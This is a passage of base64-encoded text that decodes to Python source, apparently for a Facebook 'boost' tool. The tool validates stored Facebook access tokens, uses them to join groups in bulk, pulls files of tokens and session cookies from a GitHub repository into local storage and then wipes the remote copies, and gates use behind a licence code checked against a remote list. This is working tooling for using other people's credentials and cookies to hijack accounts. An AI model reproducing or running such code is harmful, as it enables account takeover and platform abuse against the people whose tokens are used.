gPT0gJzEnOgogICAgICAgIG1heigpCiAgICBpZiBjaG9pY2UgPT0gJzInOgogICAgICAgIHN0YXJ0KCkKICAgIGVsc2U6IAogICAgICAgIHByaW50KCJpbnZhbGlkIHBvIikKICAgICAgICBjbGVhcl9zY3JlZW4oKQoKCgogICAgICAgICAgIAoKCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcKaW1wb3J0IG9zCgpDT0RFX0ZJTEUgPSAnL3NkY2FyZC9ib29zdHBoZXJlL2dlbmVyYXRlZF9jb2RlLnR4dCcgICMgRmlsZSB0byBzdG9yZSB0aGUgZ2VuZXJhdGVkIGNvZGUKCmRlZiBlbnN1cmVfZmlsZV9leGlzdHMoKToKICAgICIiIkVuc3VyZSB0aGF0IHRoZSBjb2RlIGZpbGUgZXhpc3RzIGJ5IGNyZWF0aW5nIGl0IGlmIGl0IGRvZXNuJ3QgZXhpc3QuIiIiCiAgICBvcGVuKENPREVfRklMRSwgJ2EnKS53cml0ZSgnJykgICMgVGhpcyB3aWxsIGNyZWF0ZSB0aGUgZmlsZSBpZiBpdCBkb2Vzbid0IGV4aXN0LCBidXQgd29uJ3QgbW9kaWZ5IGl0LgoKZGVmIGdlbmVyYXRlX2NvZGUoKToKICAgICIiIkdlbmVyYXRlIGEgdW5pcXVlIGNvZGUgaW4gdGhlIGZvcm1hdCBCT09TVFBIRVJFLVhYWC1YWFhYWC4iIiIKICAgIHByZWZpeCA9ICJCT09TVFBIRVJFIgogICAgbnVtYmVyX3BhcnQgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2VzKHN0cmluZy5kaWdpdHMsIGs9MykpICAjIDMgcmFuZG9tIGRpZ2l0cwogICAgbGV0dGVyc19wYXJ0ID0gJycuam9pbihyYW5kb20uY2hvaWNlcyhzdHJpbmcuYXNjaWlfdXBwZXJjYXNlICsgc3RyaW5nLmRpZ2l0cywgaz01KSkgICMgNSBhbHBoYW51bWVyaWMgY2hhcmFjdGVycwogICAgY29kZSA9IGYie3ByZWZpeH0te251bWJlcl9wYXJ0fS17bGV0dGVyc19wYXJ0fSIKICAgIHJldHVybiBjb2RlCgpkZWYgc2F2ZV9jb2RlKGNvZGUpOgogICAgIiIiU2F2ZSB0aGUgZ2VuZXJhdGVkIGNvZGUgdG8gYSBmaWxlLiIiIgogICAgd2l0aCBvcGVuKENPREVfRklMRSwgJ3cnKSBhcyBmaWxlOgogICAgICAgIGZpbGUud3JpdGUoY29kZSkKCmRlZiBsb2FkX2NvZGUoKToKICAgICIiIkxvYWQgdGhlIGNvZGUgZnJvbSB0aGUgZmlsZSwgaWYgaXQgZXhpc3RzLiIiIgogICAgaWYgb3MucGF0aC5leGlzdHMoQ09ERV9GSUxFKToKICAgICAgICB3aXRoIG9wZW4oQ09ERV9GSUxFLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIHJldHVybiBmaWxlLnJlYWQoKS5zdHJpcCgpCiAgICByZXR1cm4gTm9uZQoKZGVmIGlzX2NvZGVfYXBwcm92ZWQoY29kZSk6CiAgICAiIiJDaGVjayBpZiB0aGUgZ2VuZXJhdGVkIGNvZGUgaXMgYXBwcm92ZWQgYnkgZmV0Y2hpbmcgdGhlIGFwcHJvdmFsIGxpc3QuIiIiCiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS90ZXN0ZXJ6NTU5L0JPT1NUSU5HQVBQUk9WQUwvcmVmcy9oZWFkcy9tYWluL0FwcHJvdmFsIikKICAgICAgICByZXNwb25zZS5yYWlzZV9mb3Jfc3RhdHVzKCkgICMgUmFpc2UgYW4gZXJyb3IgZm9yIGJhZCByZXNwb25zZXMKICAgICAgICBhcHByb3ZlZF9jb2RlcyA9IHJlc3BvbnNlLnRleHQuc3BsaXRsaW5lcygpICAjIFNwbGl0IHRoZSByZXNwb25zZSBpbnRvIGxpbmVzCiAgICAgICAgCiAgICAgICAgIyBSZW1vdmUgY29tbWVudHMgYW5kIHN0cmlwIHdoaXRlc3BhY2UsIHRoZW4gY2hlY2sgZm9yIHRoZSBjb2RlCiAgICAgICAgYXBwcm92ZWRfY29kZXMgPSBbbGluZS5zcGxpdCgnIycpWzBdLnN0cmlwKCkgZm9yIGxpbmUgaW4gYXBwcm92ZWRfY29kZXMgaWYgbGluZV0KICAgICAgICByZXR1cm4gY29kZSBpbiBhcHByb3ZlZF9jb2RlcyAgIyBDaGVjayBpZiB0aGUgY29kZSBpcyBpbiB0aGUgYXBwcm92ZWQgbGlzdAogICAgZXhjZXB0IHJlcXVlc3RzLlJlcXVlc3RFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkVycm9yIGZldGNoaW5nIHRoZSBhcHByb3ZhbCBsaXN0OiB7ZX0iKQogICAgICAgIHJldHVybiBGYWxzZQoKCmRlZiBnZW5lcmF0ZV9hbmRfY2hlY2tfY29kZSgpOgogICAgIiIiR2VuZXJhdGUgYSBjb2RlIGlmIG5vdCBleGlzdGluZywgY2hlY2sgaWYgaXQncyBhcHByb3ZlZCwgdGhlbiBydW4gbWFpbigpLiIiIgogICAgZW5zdXJlX2ZpbGVfZXhpc3RzKCkgICMgRW5zdXJlIHRoZSBjb2RlIGZpbGUgZXhpc3RzIGJlZm9yZSBwcm9jZWVkaW5nCiAgICAKICAgIGNvZGUgPSBsb2FkX2NvZGUoKQogICAgCiAgICBpZiBjb2RlIGlzIE5vbmUgb3IgY29kZSA9PSAnJzoKICAgICAgICBjb2RlID0gZ2VuZXJhdGVfY29kZSgpCiAgICAgICAgc2F2ZV9jb2RlKGNvZGUpCiAgICAgICAgY2xlYXJfc2NyZWVuKCkKICAgICAgICBqb3ZhbigpCiAgICAgICAgCiAgICAgICAgcHJpbnQoZiIgICAgICB7eWVsbG93fVlPVVIgR0VORVJBVEVEIENPREUge3doaXRlfToge3JlZH17Y29kZX0iKQogICAgZWxzZToKICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgIGpvdmFuKCkKICAgICAgICAKICAgICAgICBwcmludChmIiAgICAge3llbGxvd31ZT1VSIENPREUge3doaXRlfToge3JlZH17Y29kZX0iKQoKICAgIGlmIGlzX2NvZGVfYXBwcm92ZWQoY29kZSk6CiAgICAgICAgbWFpbigpCiAgICBlbHNlOgogICAgICAgIHByaW50KGYiICAgICB7cmVkfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIHByaW50KGYiICAgICB7cmVkfUNPREUgSVMgTk9UIEFQUFJPVkVEICEge3llbGxvd31QTEVBU0UgU0VORCBJVCBUTyB7d2hpdGV9OiB7eWVsbG93fWh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwNzgwNDMyMjIyNjAiKQoKaW1wb3J0IHJlcXVlc3RzCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IsIGFzX2NvbXBsZXRlZAoKZGVmIGdldF9wcm9maWxlX2lkKGFjY2Vzc190b2tlbik6CiAgICAiIiJSZXRyaWV2ZSB0aGUgcHJvZmlsZSBJRCB1c2luZyB0aGUgcHJvdmlkZWQgYWNjZXNzIHRva2VuLiIiIgogICAgdHJ5OgogICAgICAgIHVybCA9ICdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZScKICAgICAgICBwYXJhbXMgPSB7J2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbn0KICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwsIHBhcmFtcz1wYXJhbXMpCiAgICAgICAgCiAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UuanNvbigpLmdldCgnaWQnKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJldHVybiBOb25lCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uOgogICAgICAgIHJldHVybiBOb25lCgppbXBvcnQgcmVxdWVzdHMKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciwgYXNfY29tcGxldGVkCgpkZWYgam9pbl9ncm91cChncm91cF9pZCwgcHJvZmlsZV9pZCwgYWNjZXNzX3Rva2VuKToKICAgICIiIkF0dGVtcHQgdG8gam9pbiBhIGdyb3VwIHVzaW5nIHRoZSBwcm92aWRlZCBhY2Nlc3MgdG9rZW4uIiIiCiAgICB0cnk6CiAgICAgICAgIyBDb25zdHJ1Y3QgdGhlIFVSTCBieSBpbmNsdWRpbmcgdGhlIHByb2ZpbGUgSUQgaW4gdGhlIHBhdGgKICAgICAgICB1cmwgPSBmJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3tncm91cF9pZH0vbWVtYmVycy97cHJvZmlsZV9pZH0nCiAgICAgICAgcGFyYW1zID0geydhY2Nlc3NfdG9rZW4nOiBhY2Nlc3NfdG9rZW59CiAgICAgICAgCiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwgcGFyYW1zPXBhcmFtcykKICAgICAgICAKICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgIHJldHVybiBUcnVlCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uOgogICAgICAgIHJldHVybiBGYWxzZQppbXBvcnQgcmVxdWVzdHMKI2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL2RlYnVnX3Rva2VuP2lucHV0X3Rva2VuPXt0b2tlbn0mYWNjZXNzX3Rva2VuPXt0b2tlbn0KZGVmIHZhbCh0b2tlbik6CiAgICAjIENyZWF0ZSB0aGUgdmFsaWRhdGlvbiBVUkwKICAgIHZhbGlkYXRpb25fdXJsID0gZiJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9kZWJ1Z190b2tlbj9pbnB1dF90b2tlbj17dG9rZW59JmFjY2Vzc190b2tlbj17dG9rZW59IgoKICAgICMgU2VuZCB0aGUgcmVxdWVzdCB0byB0aGUgRmFjZWJvb2sgR3JhcGggQVBJCiAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh2YWxpZGF0aW9uX3VybCkKCiAgICAjIFJldHVybiB0aGUgcmVzcG9uc2UgYXMgSlNPTiBpZiB2YWxpZCwgb3RoZXJ3aXNlIHJldHVybiBOb25lCiAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKQogICAgZWxzZToKICAgICAgICByZXR1cm4gTm9uZQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGJhc2U2NAoKIyBZb3VyIEdpdEh1YiB0b2tlbgp0b2tlbiA9ICcnCgojIEdpdEh1YiBBUEkgaGVhZGVycwpoZWFkZXJzID0gewogICAgJ0F1dGhvcml6YXRpb24nOiBmJ3Rva2VuIHt0b2tlbn0nLAogICAgJ0FjY2VwdCc6ICdhcHBsaWNhdGlvbi92bmQuZ2l0aHViLnYzK2pzb24nCn0KCiMgRGVmaW5lIGZpbGUgb3B0aW9ucyBmb3Igc3RvcmluZyB0b2tlbnMKZmlsZV9vcHRpb25zID0gewogICAgMTogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCIsCiAgICAyOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQVBBR0VTLnR4dCIsCiAgICAzOiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV0FDQ09VTlQudHh0IiwKICAgIDQ6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0Igp9CgpkZWYgZ2l0KHJlcG9fb3duZXIsIHJlcG9fbmFtZSwgZmlsZV9wYXRoKToKICAgICMgR2l0SHViIEFQSSBVUkwgZm9yIGZpbGUgY29udGVudAogICAgZmlsZV91cmwgPSBmJ2h0dHBzOi8vYXBpLmdpdGh1Yi5jb20vcmVwb3Mve3JlcG9fb3duZXJ9L3tyZXBvX25hbWV9L2NvbnRlbnRzL3tmaWxlX3BhdGh9JwoKICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KGZpbGVfdXJsLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAKICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICBjb250ZW50ID0gcmVzcG9uc2UuanNvbigpCiAgICAgICAgZmlsZV9zaGEgPSBjb250ZW50WydzaGEnXQogICAgICAgIGZpbGVfY29udGVudCA9IGJhc2U2NC5iNjRkZWNvZGUoY29udGVudFsnY29udGVudCddKS5kZWNvZGUoJ3V0Zi04JykKICAgICAgICByZXR1cm4gZmlsZV9jb250ZW50LCBmaWxlX3NoYQogICAgZWxpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSA0MDQ6CiAgICAgICAgcHJpbnQoZiIgICAgIEZBSUxFRCIpCiAgICAgICAgcmV0dXJuIE5vbmUsIE5vbmUKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoZiIgICAgIEZBSUxFRCIpCiAgICAgICAgcmV0dXJuIE5vbmUsIE5vbmUKCmRlZiBjb250aW50KHJlcG9fb3duZXIsIHJlcG9fbmFtZSwgZmlsZV9wYXRoLCBmaWxlX3NoYSk6CiAgICAjIEdpdEh1YiBBUEkgVVJMIGZvciB1cGRhdGluZyB0aGUgZmlsZSBjb250ZW50IChjbGVhcmluZyB0aGUgZmlsZSkKICAgIGZpbGVfdXJsID0gZidodHRwczovL2FwaS5naXRodWIuY29tL3JlcG9zL3tyZXBvX293bmVyfS97cmVwb19uYW1lfS9jb250ZW50cy97ZmlsZV9wYXRofScKICAgIAogICAgZW1wdHlfY29udGVudCA9IGJhc2U2NC5iNjRlbmNvZGUoJycuZW5jb2RlKCd1dGYtOCcpKS5kZWNvZGUoJ3V0Zi04JykKICAgIGNvbW1pdF9tZXNzYWdlID0gZiJDbGVhciB7ZmlsZV9wYXRofSIKCiAgICBkYXRhID0gewogICAgICAgICJtZXNzYWdlIjogY29tbWl0X21lc3NhZ2UsCiAgICAgICAgImNvbnRlbnQiOiBlbXB0eV9jb250ZW50LAogICAgICAgICJzaGEiOiBmaWxlX3NoYQogICAgfQoKICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucHV0KGZpbGVfdXJsLCBqc29uPWRhdGEsIGhlYWRlcnM9aGVhZGVycykKICAgIAogICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgIHBhc3MKICAgIGVsc2U6CiAgICAgICAgcGFzcwoKZGVmIGNob29zZV9maWxlX3BhdGgoKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBwcmludChmIiIiICAgICBcMDMzWzE7MzdtQ0hPT1NFIFRZUEUgT0YgRklMRSBUTyBTQVZFIFRPS0VOUzogCiAgICAgXDAzM1sxOzM0bVsxXSBcMDMzWzE7MzJtRlJBIEFDQ09VTlQgCiAgICAgXDAzM1sxOzM0bVsyXSBcMDMzWzE7MzJtRlJBIFBBR0VTCiAgICAgXDAzM1sxOzM0bVszXSBcMDMzWzE7MzJtUlBXIEFDQ09VTlQKICAgICBcMDMzWzE7MzRtWzRdIFwwMzNbMTszMm1SUFcgUEFHRVMKICAgICBcMDMzWzE7MzFtWzBdIFwwMzNbMTszMW1FWElUIAogICAgXDAzM1sxOzMxbeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iIiIpCgogICAgIyBBc2sgdGhlIHVzZXIgdG8gZW50ZXIgdGhlaXIgY2hvaWNlCiAgICBjaG9pY2UgPSBpbnQoaW5wdXQoZiIgICAgIHtyZWR9RU5URVIgTlVNQkVSIHt3aGl0ZX06ICIpKQogICAgCiAgICBpZiBjaG9pY2UgPT0gMDoKICAgICAgICBwcmludCgiRXhpdGluZyB0aGUgcHJvZ3JhbS4iKQogICAgICAgIGV4aXQoKSAgIyBFeGl0IHRoZSBwcm9ncmFtIGlmIHRoZSB1c2VyIGNob29zZXMgMAogICAgZWxpZiBjaG9pY2UgaW4gZmlsZV9vcHRpb25zOgogICAgICAgIHJldHVybiBmaWxlX29wdGlvbnNbY2hvaWNlXSAgIyBSZXR1cm4gdGhlIHNlbGVjdGVkIGZpbGUgcGF0aAogICAgZWxzZToKICAgICAgICBwcmludCgiSW52YWxpZCBjaG9pY2UuIFBsZWFzZSB0cnkgYWdhaW4uIikKICAgICAgICByZXR1cm4gY2hvb3NlX2ZpbGVfcGF0aCgpICAjIFJldHJ5IGlmIHRoZSBjaG9pY2UgaXMgaW52YWxpZAoKZGVmIGN5bnQoY29udGVudCk6CiAgICAjIENvdW50IHRoZSBudW1iZXIgb2YgdG9rZW5zIGJ5IHNwbGl0dGluZyB0aGUgY29udGVudCBpbnRvIGxpbmVzCiAgICB0b2tlbnMgPSBjb250ZW50LnNwbGl0bGluZXMoKQogICAgcmV0dXJuIGxlbih0b2tlbnMpCgpkZWYgY291bnRfY29va2llcyhjb29raWVzX2NvbnRlbnQpOgogICAgIyBDb3VudCB0aGUgbnVtYmVyIG9mIGNvb2tpZXMgYnkgc3BsaXR0aW5nIHRoZSBjb250ZW50IGludG8gbGluZXMKICAgIGNvb2tpZXMgPSBjb29raWVzX2NvbnRlbnQuc3BsaXRsaW5lcygpCiAgICByZXR1cm4gbGVuKGNvb2tpZXMpCgpkZWYgZ2l0aHVidG9rcygpOgogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIHJlcG9fb3duZXIgPSAnYm9vc3RwaGVyZScgICMgQ2hhbmdlIHRoaXMgdG8geW91ciBHaXRIdWIgdXNlcm5hbWUKICAgIAogICAgcmVwb19uYW1lID0gaW5wdXQoZiIgICAge3llbGxvd31DT0RFOiAiKQoKICAgICMgRmV0Y2ggY29udGVudHMgb2YgdGhlIFRva2VucyBmaWxlCiAgICB0b2tlbnNfY29udGVudCwgdG9rZW5zX3NoYSA9IGdpdChyZXBvX293bmVyLCByZXBvX25hbWUsICdUb2tlbnMnKQogICAgaWYgdG9rZW5zX2NvbnRlbnQ6CiAgICAgICAgdG9rZW5fY291bnQgPSBjeW50KHRva2Vuc19jb250ZW50KQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIHByaW50KGYiICAgICAgIHtyZWR9e3Rva2VuX2NvdW50fSB7Z3JlZW59VE9LRU5TIEZPVU5EICEiKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgICMgQXNrIHRoZSB1c2VyIHdoZXJlIHRvIHN0b3JlIHRoZSB0b2tlbnMKICAgICAgICBzdG9yYWdlX3BhdGggPSBjaG9vc2VfZmlsZV9wYXRoKCkKICAgICAgICB3aXRoIG9wZW4oc3RvcmFnZV9wYXRoLCAnYScpIGFzIGZpbGU6CgogICAgICAgICAgIGZpbGUud3JpdGUodG9rZW5zX2NvbnRlbnQgKyAnXG4nKSAgIyBBcHBlbmQgbmV3IHRva2VucyB0byB0aGUgZmlsZQoKICAgICAgICAKICAgICAgICAjIENsZWFyIHRoZSBUb2tlbnMgZmlsZQogICAgICAgIGNvbnRpbnQocmVwb19vd25lciwgcmVwb19uYW1lLCAnVG9rZW5zJywgdG9rZW5zX3NoYSkKCiAgICAjIEZldGNoIGNvbnRlbnRzIG9mIHRoZSBDb29raWVzIGZpbGUKICAgIGNvb2tpZXNfY29udGVudCwgY29va2llc19zaGEgPSBnaXQocmVwb19vd25lciwgcmVwb19uYW1lLCAnQ29va2llcycpCiAgICAKICAgIGlmIGNvb2tpZXNfY29udGVudDoKICAgICAgICBjb29raWVfY291bnQgPSBjb3VudF9jb29raWVzKGNvb2tpZXNfY29udGVudCkKICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBwcmludChmIiAgICAgICB7cmVkfXtjb29raWVfY291bnR9IHtncmVlbn1DT09LSUVTIEZPVU5EICEiKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgICMgQXNrIHRoZSB1c2VyIHdoZXJlIHRvIHN0b3JlIHRoZSBjb29raWVzCiAgICAgICAgY29va2llX3BhdGggPSBpbnB1dCgiUEFUSCBUTyBTQVZFIENPT0tJRVM6ICIpCiAgICAgICAgd2l0aCBvcGVuKGNvb2tpZV9wYXRoLCAnYScpIGFzIGNvb2tpZV9maWxlOgoKICAgICAgICAgICAgY29va2llX2ZpbGUud3JpdGUoY29va2llc19jb250ZW50ICsgJ1xuJykgICMgQXBwZW5kIG5ldyBjb29raWVzIHRvIHRoZSBmaWxlCgogICAgICAgIAogICAgICAgICMgQ2xlYXIgdGhlIENvb2tpZXMgZmlsZQogICAgICAgIGNvbnRpbnQocmVwb19vd25lciwgcmVwb19uYW1lLCAnQ29va2llcycsIGNvb2tpZXNfc2hhKQogICAgZWxzZToKICAgICAgICBwYXNzCgoKCgoKZGVmIGNoZWNrKCk6CiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgZmlsZV9vcHRpb25zID0gewogICAgICAgIDE6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBQUNDT1VOVC50eHQiLAogICAgICAgIDI6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBUEFHRVMudHh0IiwKICAgICAgICAzOiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV0FDQ09VTlQudHh0IiwKICAgICAgICA0OiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV1BBR0VTLnR4dCIKICAgIH0KCiAgICAjIERpc3BsYXkgdGhlIGF2YWlsYWJsZSBmaWxlIG9wdGlvbnMKICAgIHByaW50KGYiIiIgICAgIFwwMzNbMTszN21DSE9PU0UgVFlQRSBPRiBGSUxFIFRPIFZFUklGWTogCiAgICAgXDAzM1sxOzM0bVsxXSBcMDMzWzE7MzJtRlJBIEFDQ09VTlQgCiAgICAgXDAzM1sxOzM0bVsyXSBcMDMzWzE7MzJtRlJBIFBBR0VTCiAgICAgXDAzM1sxOzM0bVszXSBcMDMzWzE7MzJtUlBXIEFDQ09VTlQKICAgICBcMDMzWzE7MzRtWzRdIFwwMzNbMTszMm1SUFcgUEFHRVMKICAgICBcMDMzWzE7MzFtWzBdIFwwMzNbMTszMW1FWElUIAogICAgXDAzM1sxOzMxbeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iIiIpCgogICAgY2hvaWNlID0gaW50KGlucHV0KGYiICAgICB7Z3JlZW59RW50ZXIgeW91ciBjaG9pY2U6ICIpKQogICAgaWYgY2hvaWNlIGluIGZpbGVfb3B0aW9uczoKICAgICAgICBmaWxlX3BhdGggPSBmaWxlX29wdGlvbnNbY2hvaWNlXQogICAgZWxpZiBjaG9pY2UgPT0gMDoKICAgICAgICBwcmludCgiRXhpdGluZy4uLiIpCiAgICAgICAgcmV0dXJuCiAgICBlbHNlOgogICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4gRXhpdGluZy4uLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBSZWFkIHRoZSB0b2tlbnMgZnJvbSB0aGUgc2VsZWN0ZWQgZmlsZQogICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOgogICAgICAgIGxpbmVzID0gZmlsZS5yZWFkbGluZXMoKQoKICAgIHZhbGlkX3Rva2VucyA9IFtdCiAgICAKICAgICMgVmFsaWRhdGUgZWFjaCB0b2tlbiBhbmQga2VlcCB2YWxpZCBvbmVzCiAgICBmb3IgbGluZSBpbiBsaW5lczoKICAgICAgICB1aWQsIHRva2VuID0gbGluZS5zdHJpcCgpLnNwbGl0KCd8JykKICAgICAgICBpZiB2YWwodG9rZW4pOgogICAgICAgICAgICB2YWxpZF90b2tlbnMuYXBwZW5kKGxpbmUuc3RyaXAoKSkKICAgICAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgIHByaW50KGYiICAgICB7Z3JlZW59QUNDT1VOVCDilIDilIDilIDilIDilIA+IHtibHVlfXt1aWR9IHt3aGl0ZX09IHt5ZWxsb3d9IElTIFZBTElEIikKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICAgICAgcHJpbnQoZiIgICAgIHtyZWR9QUNDT1VOVCDilIDilIDilIDilIDilIA+IHtibHVlfXt1aWR9IHt3aGl0ZX09IHt5ZWxsb3d9IElTIE5PVCBWQUxJRCBBTkQgV0lMTCBCRSBSRU1PVkVEIikKCiAgICAjIFdyaXRlIHRoZSB2YWxpZCB0b2tlbnMgYmFjayB0byB0aGUgZmlsZQogICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3cnKSBhcyBmaWxlOgogICAgICAgIGZvciB2YWxpZF90b2tlbiBpbiB2YWxpZF90b2tlbnM6CiAgICAgICAgICAgIGZpbGUud3JpdGUodmFsaWRfdG9rZW4gKyAnXG4nKQoKICAgIAoKCmRlZiBwZXJmb3JtX2dyb3VwX2pvaW4oKToKICAgICIiIlBlcmZvcm0gZ3JvdXAgam9pbnMgYmF